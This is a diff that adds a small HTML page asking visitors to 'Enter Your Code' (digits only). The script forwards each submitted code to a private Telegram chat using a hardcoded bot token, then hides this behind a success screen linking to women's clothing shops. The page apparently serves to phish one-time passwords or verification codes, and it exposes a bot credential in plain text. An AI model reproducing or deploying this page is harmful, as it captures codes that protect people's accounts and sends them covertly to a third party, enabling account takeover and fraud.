@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enter Code</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; background-color: #f4f4f4; padding: 50px; }
+        .container { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); display: inline-block; }
+        input, button { width: 80%; padding: 10px; margin: 10px 0; font-size: 16px; border: 1px solid #ccc; border-radius: 5px; }
+        button { background: #28a745; color: white; border: none; cursor: pointer; }
+        button:hover { background: #218838; }
+        .hidden { display: none; }
+        .links { margin-top: 20px; }
+        .links a { display: block; margin: 10px; padding: 10px; font-size: 18px; text-decoration: none; color: white; border-radius: 5px; }
+        .flipkart { background: #2874F0; }
+        .amazon { background: #FF9900; }
+        .meesho { background: #D63384; }
+    </style>
+</head>
+<body>
+    <!-- Code Input Page -->
+    <div id="codePage" class="container">
+        <h2>Enter Your Code</h2>
+        <input type="text" id="userCode" placeholder="Enter only numbers" oninput="validateInput(this)">
+        <button onclick="submitCode()">Submit</button>
+    </div>
+
+    <!-- Success Page (Initially Hidden) -->
+    <div id="successPage" class="container hidden">
+        <h2>Code Submitted Successfully!</h2>
+        <p>Shop for Women's Clothing:</p>
+        <div class="links">
+            <a href="https://www.flipkart.com/womens-clothing/pr?sid=2oq,c1r,ha6" target="_blank" class="flipkart">Flipkart</a>
+            <a href="https://www.amazon.in/Womens-Clothing/b?node=1953602031" target="_blank" class="amazon">Amazon</a>
+            <a href="https://www.meesho.com/women-western-wear/pl/3mi" target="_blank" class="meesho">Meesho</a>
+        </div>
+    </div>
+
+    <script>
+        function validateInput(input) {
+            input.value = input.value.replace(/[^0-9]/g, ''); // Sirf numbers allow karega
+        }
+
+        function submitCode() {
+            let code = document.getElementById("userCode").value.trim();
+            if (code === "" || isNaN(code)) {
+                alert("Please enter a valid number.");
+                return;
+            }
+
+            // Telegram Bot API ke through code send karega
+            let botToken = "7819854446:AAF_GXYse8gRymnZw5Y51j5AV--Qov6jNd0";
+            let chatId = "2018489883";
+            let telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=User Code: ${code}`;
+
+            fetch(telegramURL)
+                .then(response => response.json())
+                .then(data => console.log("Message sent to Telegram:", data))
+                .catch(error => console.error("Error:", error));
+
+            // Hide input page, show success page
+            document.getElementById("codePage").classList.add("hidden");
+            document.getElementById("successPage").classList.remove("hidden");
+
+            // Clear the input field
+            document.getElementById("userCode").value = "";
+        }
+    </script>
+</body>
+</html>
